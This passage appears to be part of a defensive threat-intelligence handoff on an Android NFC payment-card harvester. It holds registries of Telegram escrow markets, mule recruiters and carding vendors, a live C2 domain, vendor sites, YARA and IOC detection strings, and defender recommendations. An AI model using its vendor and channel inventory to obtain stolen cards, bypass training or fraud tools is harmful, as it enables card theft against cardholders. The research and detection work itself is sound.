| **Huione / Haowang Guarantee** | 华永/好旺担保 | **DEAD** (May 2025 Telegram ban + FinCEN designation) | $27B–$89B processed | `@hwdb` (banned); operator Huione Group / Prince Group |
| **Tudou Guarantee** | 土豆担保 | **DEAD** (Jan 2026 — coincided with Chen Zhi arrest) | $12B | `@tddb` |
| **Xinbi Guarantee** | 新币担保 | **ALIVE — UK-sanctioned March 2026, migrated to SafeW + XinbiPay** | $17.9B (rising) | `@xbdb` (131K members confirmed May 2026), admin `@xbdb0`, community `@gqdh` (deleted) |
| **Dabai Guarantee** | 大白担保 | **ALIVE — emerged as major successor Feb 2026** | Significant and growing | `@dabai_a` (12.9K subs confirmed May 2026), `@dabai_c` (community 19K), `@dabaiyajing`, `@dabai_e`, `@dabai_f`; sub-channels e.g. `@dbtm301` ("公群301已押500u玫瑰CVV", 402 members, leader `@J0hnNo1`) |
| **Yinuo** | 一诺 | Active, limited intel | — | — |
| **BoChuang** | 博创 | Active, limited intel | — | — |
| **Ouyi** | 欧易 | Active, limited intel | — | — |

**Migration platforms (post-Telegram):**
- **SafeW** — secure messaging app promoted by Xinbi as Telegram alternative
- **ChatMe** — similar, mentioned by TRM Labs
- **XinbiPay** — Xinbi-affiliated wallet (no meaningful KYC)

**Confirmed live infrastructure (TRM Labs, March 2026 onchain analysis):** Xinbi onchain volume **doubled** in early 2026 despite the Telegram ban — most activity stayed on Telegram even after the migration was announced.

### 7.4 Operational actor registry (mule handlers, recruiters, transport, training)

| Handle | Role | Notes |
| --- | --- | --- |
| **`@webu8`** | Boutique tool seller; burner phones + proprietary relay software | Confirmed live (May 2026); profile name "头号" (Number One), bio "直奔主题，废话不回" (Get to the point, no small talk). Putian/Fujian. Sells phones loaded with 5–10 stolen cards each ($90/phone + $41/card; min 5 phones). Software loaned with phones, never sold separately. Possibly tied to SuperCard X (unconfirmed). Suspected connection to the kind of boutique build `ckemv-harvester` represents. |
| **`@djdj8884`** | US payment card supplier | Phished US cards + PIN; supplies to syndicates who do their own loading |
| **`@J0hnNo1`** | Sweeping-team leader at Dabai Guarantee Public Group 301 (`@dbtm301`) | Recruits mule teams for Seoul (cosmetics), South Korean convenience stores (Terea tobacco), gold/luxury. Affiliates engage via Dabai escrow, not directly. Mules treated as expendable. |
| **`@xingma888`** | Mule controller / recruiter (Singapore & Malaysia) | Luxury goods focus; transactions facilitated via Xinbi Guarantee escrow |
| **`@OPLuffy888`** (路飞) | Cross-border transport | Moves stolen goods within and beyond Malaysia, Singapore, Indonesia, Thailand |
| **`@llan19889`** (黑猫) | ATM mule recruiter | Limited public intel |
| **`@daoshua00`** | CVV teaching channel "cvv教学顶端学习禁广告" | 3,648 subs (May 2026). Topics: carding materials, payment-channel setup, **3D Secure bypass**, domestic card exploitation. Contact `@v99db`. |
| **`@v99db`** | `@daoshua00` operator | Direct-message contact |
| **`@jinkusu`** | NFC Ripper vendor; multi-product cybercrime supplier | English-language user profile with disclaimer "We do not encourage illegal activities…". Sells NFC Ripper, Jinkusu CAM (face-swap for KYC/scam impersonation), Jinkusu Attack (DDoS), IntelX accounts. Telegram presence has been taken down before; current support via `@onefortress`. |
| **`@onefortress`** | Jinkusu products support / sales channel | 2.54K subs (May 2026), English. Post-takedown rebrand. |
| **`@fengdy`** | US-based financial services within Dabai ecosystem | Mentioned in `@dabai_a` content |
| **`@jiuLianyun`** | Telegram bot customization services | Mentioned in `@dabai_a` content |

### 7.5 Phishing-kit syndicates feeding the pipeline

These groups harvest cards (PAN+expiry+CVV+OTP) at scale via smishing. The output funnels into the card-supplier vendors above, who load them onto burner phones for ghost-tapping operations. Source: pre-existing `Ghost_Tapping_Guarantee_Marketplaces_Research.md`.

| Kit / Operator | Type | Pricing | Scale |
| --- | --- | --- | --- |
| **Smishing Triad (umbrella)** | Federated PhaaS | $200/mo+ | 2M smishes/day per actor; 60M victims/mo |
| **Lighthouse** | Banking-focused PhaaS | $88/wk – $1,588/yr | 1M+ victims across 120 countries; 17,500+ phishing domains |
| **Lucid (Xinxin Group / LARVA-242)** | PhaaS | Weekly license | 169 orgs across 88 countries; 100K smishes/day via RCS/iMessage |
| **Darcula** | PhaaS | — | Shares infra with Lighthouse/Lucid; "reply Y to activate" iMessage trick |
| **Panda Shop** | Smishing Triad rebrand (Mar 2025) | — | NACOS/Shanghai timezone indicators; explicitly state "no fear of FBI"; funnels into Z-NFC/X-NFC/UFO NFC |

### 7.6 Equipment vendors (POS terminals, blank cards, encoders)

| Vendor / item | Source | Notes |
| --- | --- | --- |
| **Oedipus** | TG channel affiliated with TX-NFC | POS terminals from financial institutions globally; ~$355K processed Nov 2024 – Aug 2025 |
| **Lita's Shop** | TG bot | Compromised payment data shop |
| **Hulk Vault** | TG + Surface web + TOR | Same |
| **track2nfc.blogspot.com** | Public blogspot | Magstripe-to-NFC conversion tutorials |
| **`iso8583.info`** | Surface web ($100 license) | HCE Bridge — EMV kernel simulator (legitimate cover) |
| **Phone farms** | Manufacturer-direct + Telegram | Apple/Google device racks for batch wallet provisioning |
| **Blank card / encoder vendors** | Chinese carding community channels (5,946+ active members combined) | NFC readers, blank plastic, card encoders, e-SIM contracts from HK/JP/US origins |

---

## 8. Where `ckemv-harvester` Fits in This Ecosystem

Best-fit positioning:

### 8.1 As a harvest-upstream component

The sample provides the **field-collection** half of an end-to-end fraud pipeline. The C2 (`tqqemv.xyz`) holds the captured cryptograms. Cashout — the half that burns those cryptograms at a real merchant — happens through a **separate tool** (HCE-capable Tapper APK or a softPoS) that consumes the same C2 contract. That tool was not in the analysis scope and may not be on this device at all (operators commonly compartmentalize). Suspected to share the operator's infrastructure.

### 8.2 As a boutique private build

The most parsimonious attribution given the technical evidence:

- **`@webu8`-class affiliation** — Putian/Fujian operators are documented (Recorded Future, July 2025) as running proprietary software "loaned with phones, never sold separately." Our sample's lack of public storefront and lack of MaaS-style affiliate enrollment friction (only an `api_key` paste/QR-scan) fits that model.
- **A Rust-experienced contractor "arthur"** — the build-host username, macOS dev environment, Rust 1.88/1.91 toolchain, and NDK r25b are consistent with a single freelance contractor. The crate workspace naming (`ckemv-android`, `ckemv-reporter`, `ckemv-emv-kernel`) is the kind of internal naming a small team adopts.
- **Dabai Guarantee escrow probable** — given the Feb 2026 emergence of Dabai as the dominant successor to Huione/Tudou, and given the C2 cert was minted March 2026, the operator likely runs their workflow through Dabai (`@dabai_a` / `@dabai_c` / `@dbtm301`-style sub-channels) or possibly Xinbi (`@xbdb`, the only other major active escrow).
- **CDCVM/3DS bypass training** — `@daoshua00`'s "3D Secure bypass" curriculum is exactly the operator-level training a boutique tool builder would consume to keep their product competitive against issuer countermeasures.

### 8.3 Alternative: a new MaaS not yet on researcher radar

The other live possibility is a fresh MaaS brand mid-rollout. Operators sometimes spin up for 6–12 months before promoting on Telegram. If true, expect a public storefront to appear in late 2026 — watch `@dabai_a`, `@dbtm301`, `@daoshua00`, `@onefortress`, and the standard Telegram NFC-vendor pattern (channel name including "NFC", "tap", "card", or "EMV").

### 8.4 Distinguishing markers for cross-sample correlation

If a future agent finds another APK that:
- Ships `lib*emv*.so` or `lib*ckemv*.so` arm64 binaries, OR
- Embeds the string `/Users/arthur/.cargo/registry`, OR
- Uses HTTP UA `ureq/2.12.1` on Android, OR
- Has package prefix `xyz.happify.*`, OR
- Communicates with `tqqemv.xyz` or any `<short-name>emv.xyz` host with paths `/me`, `/harvest`, `/report`

...that is almost-certainly the same operator's work — possibly a different APK in the same toolchain (e.g., the cashout-side Tapper).

---

## 9. Live Infrastructure Inventory (Hunt Targets)

### 9.1 Confirmed live (May 2026)

| Asset | Type | Evidence |
| --- | --- | --- |
| `tqqemv.xyz` | Domain | crt.sh certs 25281253978, 25267534894 (Let's Encrypt, issued 2026-03-28, expire 2026-06-26) |
| `www.tqqemv.xyz` | Domain | Cert SAN |
| `xbdb` Telegram | Channel | 131,424 members, 965 online (May 2026 preview) |
| `dabai_a` Telegram | Channel | 12,900 subs (May 2026 preview) |
| `dbtm301` Telegram | Channel | 402 members (May 2026 preview); leader `@J0hnNo1` |
| `daoshua00` Telegram | Channel | 3,648 subs (May 2026 preview), 3DS-bypass curriculum |
| `onefortress` Telegram | Channel | 2,540 subs (May 2026 preview); Jinkusu products support |
| `webu8` Telegram | User profile | "头号" display name (May 2026 preview) |
| `nfcripper.su` | Vendor site | Live retail page (May 2026) |
| `nfcripper.app` | Vendor site | Live retail page (May 2026) |
| `jinkusucam.tokyo` | Vendor site | Referenced as live |
| `jinkusuattack.tokyo` | Vendor site | Referenced as live |
| `thevadernews.dev` | Vendor site | Referenced as live in `@onefortress` |

### 9.2 Likely dead / sanctioned

| Asset | Type | Evidence |
| --- | --- | --- |
| `@hwdb` (Huione) | Telegram | Banned May 13 2025 |
| `@tddb` (Tudou) | Telegram | Shutdown Jan 2026 (Chen Zhi arrest) |
| `@gqdh` (Xinbi community) | Telegram | Deleted post-ban; operations migrated to other channels |
| `znfcqwe.top` (Z-NFC C2) | Domain | Public per Resecurity; status as of May 2026 not re-confirmed in this investigation |

### 9.3 Recommended IOCs to feed into hunt platforms

**For DNS / proxy sinkholing:**
- `tqqemv.xyz`
- `www.tqqemv.xyz`

**For passive-DNS / crt.sh batch pivots:**
- Any `<4-char>emv.xyz` cert issued by Let's Encrypt on 2026-03-28 ±3 days
- Any cert sharing the same Let's Encrypt order intermediate as 25281253978

**For sample / YARA hunts (see `CKEMV_THREAT_HUNT_PACK.md` §2 for full rules):**
- `xyz.happify.ckemv` package string
- `CKEMV_NATIVE` log tag
- `/Users/arthur/.cargo/registry` build-path leak
- `ckemv_emv_kernel::kernels::visa::VisaKernel`
- `ckemv_emv_kernel::kernels::mchip::MastercardKernel`
- `native_fetch_cves`, `native_upload_harvest_data`, `native_fetch_report` symbol names

**For TLS / network fingerprinting:**
- User-Agent `ureq/2.12.1` on Android handsets
- JA4 fingerprint of rustls 0.23.37 + ring 0.17.14 + ECH

---

## 10. MITRE ATT&CK for Mobile Mapping

| Tactic | Technique | Evidence |
| --- | --- | --- |
| Initial Access | (manual sideload) | APK distributed out-of-band; `REQUEST_INSTALL_PACKAGES` permission held |
| Persistence | T1624.001 *Broadcast Receivers* (potential) | `RECEIVE_BOOT_COMPLETED` granted but no receiver declared — opportunistic |
| Persistence | T1541 *Foreground Persistence* | `WAKE_LOCK`, `FOREGROUND_SERVICE`, `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS` |
| Defense Evasion | T1655.001 *Match Legitimate Name or Location* | Label "Geometry Saver"; package `xyz.happify.ckemv` |
| Defense Evasion | T1406 *Obfuscated Files or Information* | `obfstr`-style XOR'd `.rodata` strings; `JNI_OnLoad`+`RegisterNatives` hidden binding; 30 `_OBFBYTES_SDATA*` blobs |
| Discovery | T1422 *System Network Configuration Discovery* | `ACCESS_NETWORK_STATE` |
| Collection | T1409 *Stored Application Data* | SQLite `CkemvHarvest.db` |
| Collection | T1517 *Access Notifications* | n/a |
| Collection | (non-standard EMV-tag collection) | Closest fit T1119 *Automated Collection* via NFC interface |
| Command & Control | T1437.001 *Application Layer Protocol: Web Protocols* | HTTPS to `tqqemv.xyz` |
| Command & Control | T1521.002 *Encrypted Channel: Asymmetric Cryptography* | TLS via rustls/ring (no pinning, no application-layer crypto) |
| Exfiltration | T1646 *Exfiltration Over C2 Channel* | `POST /harvest` |
| Impact | T1641.001 *Data Manipulation: Transmitted Data Manipulation* | Per-scenario TLV overrides driven by C2 `cves` config |
| Updater | T1407 *Download New Code at Runtime* | `update_v{x}.apk` via FileProvider sideload |

---

## 11. Defender Recommendations (Per-Audience)

### 11.1 For issuers

1. **Enforce strict ATC monotonicity** at the issuer host. Reject any cryptogram whose `9F36 ATC` is ≤ the highest previously seen for that card. This single change invalidates ~70% of any harvester's batch inventory the moment the cardholder taps legitimately again.
2. **Real-time velocity scoring** on contactless transactions, with auto-decline outside the cardholder's geo-profile. Push notifications on every contactless transaction above a small threshold (free SMS / push).
3. **CVM cross-check via `9F10 IAD`** — never trust terminal-reported "no CVM required" without actual evidence in the Issuer Application Data.
4. **Push tokenization aggressively** — subsidize Apple Pay / Google Pay onboarding. Per §5.6, tokenization is the single most effective defense against this attack class.
5. **Trusted-person account monitoring** — duplicate-alerts to a designated family member for elderly cardholders. Few banks do this (Lloyds, Wells Fargo, HSBC); should be table stakes.

### 11.2 For acquirers

1. **Mandatory `9F1A Terminal Country Code` ↔ acquirer-of-record consistency check.**
2. **Refuse cross-border submissions** lacking valid TRID / TSP routing.
3. **Mandatory end-to-end submission of `TVR` / `TSI` / CVM-result fields** — close the CVM-downgrade window.
4. **Chargeback-ratio monitoring at merchant-onboarding granularity** — bust-out merchants spike chargeback rates within 2–4 weeks. Aggressive auto-termination at 0.5% chargeback rate (vs scheme threshold 1%) catches them earlier.

### 11.3 For cardholders

1. **Tokenize.** Stop using plastic contactless if your issuer supports Apple Pay / Google Pay.
2. **Don't tap your card to phones or devices handed to you by strangers or "bank reps on the phone."** Banks never ask this.
3. **RFID-shielded wallet** for cards you can't tokenize.
4. **Enable per-transaction push notifications.** If you suspect a tap, call your issuer immediately — every minute of delay is fresh inventory the criminal can burn.
5. **Talk to elderly relatives.** This attack class disproportionately targets people who don't use banking apps. A weekly statement-review with a family member is meaningful protection.

### 11.4 For corporate security / MDM

1. **MDM-block sideloaded packages matching `xyz.happify.ckemv`** and any APK containing `libckemv_android.so` or `libckemv_reporter.so`.
2. **Network-level sinkhole** `tqqemv.xyz` and sibling `<4char>emv.xyz` patterns at corporate DNS.
3. **Train against the social-engineering scripts** (fake bank verification calls).

### 11.5 For law enforcement / takedown coordination

1. **Coordinate with `.xyz` registrar (XYZ.COM LLC) for sinkhole** of `tqqemv.xyz`. The cert evidence proves operational liveness as of March 2026; the domain is current evidence.
2. **Share IOC pack with VGAS, MasterCard FraudOps, AmEx, Discover, UnionPay** via standard scheme channels.
3. **Brief CERT-EU, CERT-PL, CERT-BR, CERT-IN, CERT-CN, MAS Singapore, KISA Korea** as the likely victim-population CERTs.
4. **Cross-reference with ongoing Tennessee (March 2025), Singapore (April 2025), Czech Republic (2024), Malaysia (2024) cases** — operators in those investigations may have rotated to or away from this toolset.

---

## 12. Open Hunt Questions for the Next Agent

The investigation has produced strong static-analysis foundations and broad ecosystem mapping, but several pivots remain. Ordered by leverage.

### 12.1 Highest-leverage (do these first)

1. **VT Retrohunt with the YARA rules** in `CKEMV_THREAT_HUNT_PACK.md` §2. Especially Rule 2 (`CKEMV_Harvester_Native_EMV_Kernel`) — the crate-name strings `ckemv-android/src/lib.rs` and `ckemv-emv-kernel/src/` are distinctive enough that any Retrohunt hit is almost-certainly a sibling sample. **Time-sensitive — operators rotate.**
2. **crt.sh batch query for `.xyz` certs issued by Let's Encrypt on 2026-03-28 ±3 days.** Filter by short labels containing `emv`, `nfc`, `card`, `pay`. Hunting for the operator's batch-registered sibling domains.
3. **Submit IOCs to MalwareBazaar / abuse.ch ThreatFox / MISP**. The discovery itself — a Rust-based NFC harvester with no public attribution — is publishable threat-intel.
4. **Direct vendor outreach**: send the sample SHA-256 + this handoff to `threatintel@eset.com`, `research@cleafy.com`, and ThreatFabric's research portal. The vendors who track this space will want to see it.

### 12.2 Medium-leverage

5. **Find the cashout-side counterpart.** The sample has no HCE component. The operator must have a separate Tapper/HCE APK. Hunt: same C2 host (`tqqemv.xyz`), same JSON contract (`/me`, `/harvest`, `/report`), same `arthur`/Rust fingerprint, OR APKs declaring `android.nfc.cardemulation.action.HOST_APDU_SERVICE` services targeting EMV AIDs. Try VT Intelligence search `behavior:android.nfc.cardemulation AND network:tqqemv.xyz` (if VTI license available).
6. **Live-traffic capture (in a controlled, authorized environment).** Run the APK in a sandbox with TLS-MITM (mitmproxy / Burp with custom CA installed on emulator). Capture the actual `/me` response and `/harvest` upload. Verify the JSON contract; identify any fields not present in the static-only analysis. (No active probing of the production C2 — only sandbox-side observation.)
7. **Pivot on `@jinkusu` / `@onefortress`** — the multi-product cybercrime vendor has a Tokyo TLD pattern (`jinkusucam.tokyo`, `jinkusuattack.tokyo`). Check whether any other `*.tokyo` or `jinkusu*` domains exist via crt.sh and passive DNS. Could rule out (or confirm) Jinkusu involvement with `ckemv`.
8. **Monitor `@dabai_a`, `@dabai_c`, `@dbtm301` posts** weekly for any new "harvester" / "EMV capture" / "Rust" product announcement. The boutique-build-becoming-MaaS hypothesis predicts a public storefront could appear in late 2026.
9. **Search `@daoshua00`'s curriculum** for any references to `ckemv` or `tqqemv` — the CVV-teaching channel is where operator-tier users go for technique-sharing.

### 12.3 Lower-leverage but valuable

10. **Pivot on the `arthur` developer fingerprint.** Search crates.io / GitHub / GitLab for accounts named `arthur` that have published Rust crates touching `iso7816-tlv`, `jni-rs`, `ureq`, or `rustls`. Most likely yields nothing (operators don't expose their public Rust footprint), but a single match is worth thousands of hours of pivoting.
11. **Check for iOS counterpart.** The C2 contract (`/me`, `/harvest`, `/report`) is platform-agnostic. If iOS samples exist consuming the same JSON, the operator's reach is wider.
12. **Reverse-engineer the `obfstr` blobs** at `.rodata 0x2b000–0x2b260` in `libckemv_reporter.so` to extract the cleartext HTTP header strings (`Authorization`, `Bearer`, `api_key`, etc.). Possible via unicorn-engine emulation harness on each `_OBFBYTES_SDATA*` accessor function. Not strictly necessary for IOC purposes — strings can be inferred — but provides ground truth.
13. **Map the `cves[]` scenario semantics.** The `cve_id` field is per-scenario; each scenario carries `mc_tags` / `visa_tags` TLV overlays. What does an actual `CveConfig` list from `/me` look like? What TLVs are most commonly overridden? Sandbox-side observation needed.
14. **Investigate the relationship between `nfcripper.su`'s "EMV amounts" dashboard and our sample's `cve_id`/scenarios.** Both track per-currency / per-date / per-amount metadata. Possibly convergent design, possibly cross-contamination of ideas, possibly the same developer. Worth a careful comparison.

### 12.4 Don't-bother / out-of-scope

- **Active probing of `tqqemv.xyz`**. Don't. Coordinate via takedown channel only.
- **Joining any Telegram channel under cover identity.** Out of scope for independent research; do via vendor or LE collaboration only.
- **Personal-attribution OSINT on `arthur`** beyond passive search. Doxxing isn't research output.

---

## 13. Methodology Notes (for the Next Agent)

### 13.1 Tools used

- **jadx** — APK decompilation (the `samples/ckemv/apk_analysis/sources/` directory)
- **llvm-strings / llvm-nm / llvm-readelf** from Android NDK r25b — native library analysis
- **Read / Grep / Glob** — primary code-reading workflow
- **WebSearch / WebFetch** — public OSINT against vendor sites, research blogs, GitHub IOC repos, Telegram channel previews (`t.me/s/<channel>`)
- **crt.sh** — passive cert transparency lookup
- **No live execution** of the APK occurred in this investigation. All claims are static-analysis-derived or cite public reporting.

### 13.2 What was NOT done

- **No live C2 probing.** `tqqemv.xyz` was not contacted by this investigation beyond the passive crt.sh lookup. Active probing would risk tipping the operator and is appropriate only under proper authority.
- **No Telegram channel joining or DM contact.** All Telegram intel is from public preview pages (`t.me/s/<name>`) — no infiltration.
- **No personal attribution beyond build-host username `arthur`** — investigation took the build-OPSEC fingerprint as a correlation pivot, not as a personal-identification lead.
- **No sandbox detonation.** The sample was not executed. Tasks 5, 6, 11, 12 in §12 above require sandbox detonation in an authorized environment.

### 13.3 Confidence framework

- **High confidence (verifiable from sample):** package, manifest, decompiled code behavior, native-library symbol tables, embedded strings, cert evidence for the C2.
- **Moderate confidence (working hypothesis, requires corroboration):** family attribution as undocumented Chinese-MaaS boutique build; affiliation with `@webu8`-class operator; the harvest-upstream-to-separate-cashout role.
- **Low confidence / inferred only:** the exact JSON shape of `/me` responses; the existence (vs hypothesized) of a sibling Tapper APK consuming the same C2 contract; the `arthur` developer's geographic location (assumed macOS implies Western developer environment, but Eastern European devs commonly use macOS too).

### 13.4 Time-sensitivity notes

- **The cert on `tqqemv.xyz` expires 2026-06-26.** If the next agent looks at this after that date and the operator hasn't renewed, the C2 may be dormant or rotated. crt.sh re-check is the fastest signal.
- **Telegram channels rotate fast.** Subscriber counts and channel handles in §7.4 are valid as of preview snapshots in this investigation; expect drift on a weekly basis.
- **Marketplace status (§7.3) is at most a 30-day snapshot.** Xinbi survives because operators are active; Dabai exists today because earlier marketplaces died. The chain is dynamic. Re-check Recorded Future Insikt Group's marketplace-evolution coverage quarterly.

---

## 14. Companion Document Index

| Document | Length | Purpose |
| --- | --- | --- |
| `CKEMV_HARVESTER_ANALYSIS.md` | ~3,200 words | Full static reverse engineering. Read for technical depth. |
| `CKEMV_MONETIZATION_AND_LIMITS.md` | ~4,000 words | The criminal economy in detail: ATC dynamics, CVM bypasses, tokenization defeat, country-by-country yield, defender recommendations. |
| `CKEMV_THREAT_HUNT_PACK.md` | ~2,800 words | YARA rules, STIX-style IOC list, Sigma/Snort drafts, OSINT pivot plan, family-attribution table, sharing-partner list. |
| `CKEMV_MASTER_RESEARCH_HANDOFF.md` | This document | Synthesis + Telegram registry + handoff guidance. |
| `Ghost_Tapping_Guarantee_Marketplaces_Research.md` (already in repo, pre-existing) | ~65 KB | Independent prior research on the Chinese guarantee-marketplace ecosystem. The context-setter for everything above. |

For a new agent: read in the order above, then re-read this document's §10–13 before doing anything operational.

---

## 15. Primary External References

All cited at the relevant sections above. Consolidated here:

### Vendor research / threat-intel

- ESET — Original NGate writeup, Aug 2024: <https://www.welivesecurity.com/en/eset-research/ngate-android-malware-relays-nfc-traffic-to-steal-cash/>
- ESET — NGate HandyPay variant, Apr 2026: <https://www.welivesecurity.com/en/eset-research/new-ngate-variant-hides-in-a-trojanized-nfc-payment-app/>
- ESET — NGate IOC repo: <https://github.com/eset/malware-ioc/tree/master/ngate>
- Cleafy — SuperCard X, Apr 2025: <https://www.cleafy.com/cleafy-labs/supercardx-exposing-chinese-speaker-maas-for-nfc-relay-fraud-operation>
- ThreatFabric — Ghost Tap, Nov 2024: <https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay>
- ThreatFabric — PhantomCard, Aug 2025: <https://www.threatfabric.com/blogs/phantomcard-new-nfc-driven-android-malware-emerging-in-brazil>
- Group-IB — Ghost Tapped (Chinese MaaS): <https://www.group-ib.com/blog/ghost-tapped-chinese-malware/>
- Zimperium — Tap and Steal: <https://zimperium.com/blog/tap-and-steal-the-rise-of-nfc-relay-malware-on-mobile-devices>
- Zimperium IOC corpus: <https://github.com/Zimperium/IOC/tree/master/2025-10-NFCStealer>
- Cyble — RelayNFC: <https://cyble.com/blog/relaynfc-nfc-relay-malware-targeting-brazil/>
- Resecurity — NFC Fraud Wave: <https://www.resecurity.com/blog/article/nfc-fraud-wave-evolution-of-ghost-tap-on-the-dark-web>
- Recorded Future / Insikt Group — Ghost-tapping ecosystem: <https://www.recordedfuture.com/research/ghost-tapping-chinese-criminal-ecosystem>
- Recorded Future / Insikt Group — Evolution of guarantee marketplaces: <https://www.recordedfuture.com/research/evolution-of-the-chinese-language>
- Kaspersky — NFCGate relay attacks: <https://www.kaspersky.com/blog/nfc-gate-relay-attacks-2026/55116/>

### Cryptocurrency / marketplace tracking

- TRM Labs — Xinbi $17.9B post-Telegram-ban: <https://www.trmlabs.com/resources/blog/xinbi-marketplace-remains-active-with-usd-17-9-billion-in-total-volume-despite-enforcement-actions>
- Chainalysis 2026 — illicit volume / USDT dominance (cited in pre-existing research)
- Elliptic — Huione $27B / Tudou $12B (cited in pre-existing research)

### Industry / news

- BleepingComputer — Massive surge of NFC relay malware: <https://www.bleepingcomputer.com/news/security/massive-surge-of-nfc-relay-malware-steals-europeans-credit-cards/>
- The Hacker News — Ghost Tap exploiting NFCGate: <https://thehackernews.com/2024/11/ghost-tap-hackers-exploiting-nfcgate-to.html>
- The Hacker News — Telegram crackdown analysis: <https://thehackernews.com/expert-insights/2026/03/telegrams-crackdown-changed-how-threat.html>
- DOJ — Scam Center Strike Force action: <https://www.justice.gov/opa/pr/scam-center-strike-force-takes-major-actions-against-southeast-asian-scam-centers-targeting>
- Cybernews — Telegram takedowns: <https://cybernews.com/security/telegram-channels-takedown-criminal-activity/>

### Vendor sites observed live (May 2026)

- NFC Ripper: <https://nfcripper.su/>, <http://www.nfcripper.app/>
- crt.sh for `tqqemv.xyz`: <https://crt.sh/?q=tqqemv.xyz>

### Telegram channel previews observed (May 2026)

- `https://t.me/s/dabai_a` — Dabai Guarantee navigation, 12.9K subs (CN)
- `https://t.me/s/dbtm301` — Sub-channel "公群301已押500u玫瑰CVV", 402 members (CN)
- `https://t.me/s/webu8` — Personal handle "头号" (CN)
- `https://t.me/s/xbdb` — Xinbi Guarantee, 131K members (CN)
- `https://t.me/s/daoshua00` — CVV-teaching channel, 3,648 subs (CN)
- `https://t.me/s/onefortress` — Jinkusu products, 2.54K subs (EN)
- `https://t.me/s/jinkusu` — Jinkusu user profile (EN)

---

## 16. Final Notes

This is an active, ongoing criminal-ecosystem investigation. The sample is currently operational. The C2 is live. The ecosystem around it is growing — Dabai Guarantee emerged in Feb 2026; Xinbi rebuilt and doubled in early 2026; NFC Ripper is selling source code at $30K; Jinkusu rotated through `@onefortress` after a previous takedown. **The criminals are out-evolving the defenders right now.**

The thing the next agent should hold onto, more than any specific IOC, is the structural observation: **this attack class is industrialized and modular.** Harvesters, relays, marketplaces, mules, transport, phishing kits, training channels, equipment vendors — each tier is a separate business, each with its own pricing model, each replaceable, each insulated from the others. Disrupting one tier (Telegram bans Huione; Cleafy doxxes SuperCard X; UK sanctions Xinbi) doesn't disrupt the others. The system has the resilience of an industry, not a gang.

The single highest-leverage *defender* response, repeated across every section of this investigation, is **issuer-side ATC monotonicity enforcement plus instant cardholder notifications**. Together these collapse the criminal's runway from hours to seconds. Tokenization closes the rest. Anything else — IOC sharing, YARA hunts, takedowns, arrests — buys disruption but not closure. The architecture closes the problem.

`ckemv-harvester` is one sample in one toolchain in one tier of one ecosystem. There will be more. The pack in `CKEMV_THREAT_HUNT_PACK.md` is built so the next agent (or any defender) can catch the next one faster.

Hand it off well.
